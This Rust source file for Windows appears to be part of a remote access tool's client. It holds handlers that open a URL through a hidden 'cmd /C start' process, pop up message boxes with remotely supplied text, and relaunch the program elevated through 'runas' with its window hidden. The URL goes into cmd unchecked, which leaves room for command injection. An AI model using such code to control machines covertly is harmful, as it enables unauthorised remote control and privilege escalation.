use std::ptr;
use std::ptr::null_mut as NULL;
use std::ffi::OsStr;
use std::os::windows::{process::CommandExt, ffi::OsStrExt};

use winapi::um::{shellapi::ShellExecuteW, winuser};
use winapi::um::winuser::SW_HIDE;
use winapi::shared::minwindef::UINT;

use crate::service::install::is_elevated;
use common::packets::{MessageBoxData, VisitWebsiteData};


pub fn visit_website(
    visit_data: &VisitWebsiteData
) {
    let visit_type = visit_data.visit_type.as_str();
    let url = visit_data.url.as_str();

    const DETACH: u32 = 0x00000008;
    const HIDE: u32 = 0x08000000;

    if visit_type == "normal" {
        //println!("Opening URL: {}", url);
        std::process::Command
            ::new("cmd")
            .args(["/C", "start", url])
            .creation_flags(HIDE | DETACH)
            .spawn()
            .unwrap();
    }
}

pub fn show_messagebox(data: MessageBoxData) {
    let l_msg: Vec<u16> = format!("{}\0", data.message).encode_utf16().collect();
    let l_title: Vec<u16> = format!("{}\0", data.title).encode_utf16().collect();

    let button = data.button.as_str();
    let icon = data.icon.as_str();

    unsafe {
        winuser::MessageBoxW(
            NULL(),
            l_msg.as_ptr(),
            l_title.as_ptr(),
            (match button {
                "ok" => winuser::MB_OK,
                "ok_cancel" => winuser::MB_OKCANCEL,
                "abort_retry_ignore" => winuser::MB_ABORTRETRYIGNORE,
                "yes_no_cancel" => winuser::MB_YESNOCANCEL,
                "yes_no" => winuser::MB_YESNO,
                "retry_cancel" => winuser::MB_RETRYCANCEL,
                _ => winuser::MB_OK,
            }) |
                (match icon {
                    "info" => winuser::MB_ICONINFORMATION,
                    "warning" => winuser::MB_ICONWARNING,
                    "error" => winuser::MB_ICONERROR,
                    "question" => winuser::MB_ICONQUESTION,
                    "asterisk" => winuser::MB_ICONASTERISK,
                    _ => winuser::MB_ICONINFORMATION,
                })
        );
    }
}

pub fn elevate_client() {
    if is_elevated() {
        return;
    }

    crate::MUTEX_SERVICE.lock().unwrap().unlock();

    let exe = std::env::current_exe().unwrap();
    let path = exe.to_str().unwrap();

    let operation = OsStr::new("runas");
    let path_os = OsStr::new(path);
    let operation_encoded: Vec<u16> = operation.encode_wide().chain(Some(0)).collect();
    let path_encoded: Vec<u16> = path_os.encode_wide().chain(Some(0)).collect();

    unsafe {
        let h_instance = ShellExecuteW(
            ptr::null_mut(),
            operation_encoded.as_ptr(),
            path_encoded.as_ptr(),
            ptr::null(),
            ptr::null(),
            SW_HIDE
        );

        if (h_instance as UINT) > 32 {
            std::process::exit(1);
        } else {
            crate::MUTEX_SERVICE.lock().unwrap().lock();
        }
    }
}